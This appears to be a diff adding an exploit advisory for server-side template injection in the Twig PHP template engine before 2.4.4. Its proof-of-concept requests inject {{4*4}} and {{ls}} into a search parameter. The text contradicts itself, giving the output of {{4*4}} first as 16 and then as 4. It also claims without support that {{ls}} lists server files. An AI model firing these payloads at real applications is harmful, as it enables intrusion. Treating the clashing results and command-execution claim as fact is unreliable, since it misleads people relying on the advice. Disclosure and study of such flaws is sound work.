@@ -1,0 +1,22 @@
+Vulnerability details:
+# Exploit Title: Twig <2.4.4 Server side template injection 
+# Date: 02/15/2018
+# Exploit Author: JameelNabbo
+# Author website: www.jameelnabbo.com
+# Vendor Homepage: https://twig.symfony.com 
+# Software Link: https://twig.symfony.com/doc/2.x/intro.html#installation
+# Version: < 2.4.4
+# Tested on: MAC OSX
+
+1.Description:
+Twig is a modern php template engine  which compile templates down to plain optimized PHP code, Twig <2.4.4 contain SSTI vulnerability which allow attackers to execute commands within the Parameters, by just using {{COMAND TO EXECUTE}} instead of using the expected values “Normal integer or normal string", depends on the vulnerable application, which takes deferent params by GET or POST.
+
+Example: by injecting this in a search param  http://localhost/search?search_key={{4*4}} <http://localhost/search?search_key=%7B%7B4*4%7D%7D>         Output: 16
+
+
+2. POC:
+http://localhost/search?search_key={{4*4}} 
+OUTPUT: 4 
+
+http://localhost/search?search_key={{ls}} 
+OUTPUT: list of files/directories etc….
